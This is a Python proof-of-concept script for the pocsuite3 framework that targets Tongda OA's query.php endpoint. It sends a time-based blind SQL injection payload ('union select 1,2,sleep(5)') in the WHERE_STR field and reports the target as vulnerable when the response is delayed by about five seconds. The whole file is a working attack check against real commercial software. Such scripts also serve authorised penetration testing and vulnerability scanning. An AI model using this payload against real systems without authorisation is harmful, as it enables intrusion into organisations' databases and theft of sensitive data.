from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '通达OA /query.php 存在SQL注入漏洞'
    appName = '通达OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''北京通达信科科技有限公司通达OA/query.php 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        path='/general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php'
        base_data = "WHERE_STR=-@`'` union select 1,2,sleep(0)#'&"
        inject_data = "WHERE_STR=-@`'` union select 1,2,sleep(5)#'&"
        vulur1 = self.url+path
        base_resp = requests.post(vulur1, headers=headers, verify=False, allow_redirects=False, data=base_data, timeout=10)
        inject_resp = requests.post(vulur1, headers=headers, verify=False, allow_redirects=False, data=inject_data, timeout=10)
        base_time = base_resp.elapsed.total_seconds()
        inject_time = inject_resp.elapsed.total_seconds()
        if base_resp.status_code == 200 and inject_resp.status_code == 200 and (inject_time - base_time) >= 4.5 and (inject_time - base_time) <= 5.5 and '' == base_resp.text and '' == inject_resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulur1
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
